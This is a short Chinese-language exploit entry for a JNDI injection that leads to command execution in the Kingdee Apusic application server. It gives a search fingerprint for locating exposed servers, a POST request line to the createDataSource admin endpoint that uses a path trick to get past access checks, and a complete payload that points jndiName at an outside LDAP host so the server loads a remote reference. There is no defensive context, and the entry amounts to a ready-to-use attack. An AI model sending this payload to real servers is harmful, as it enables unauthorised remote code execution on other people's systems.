# 金蝶Apusic应用服务器createDataSourceJNDI注入漏洞

金蝶 ｜ 命令执行 ｜ —
- **指纹**：`body="easSessionId"`
- **请求**：`POST /admin/;//protect/datasource/createDataSource HTTP/1.1`

**Payload**
```
name=jndi1&jndiName=ldap://pegyevqmnr.dgrh3.cn&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=jndi&userName=jndi&password=jndi&repassword=jndi&connectionURL=jndi&driverClassName=java.lang.String&testCommand=
```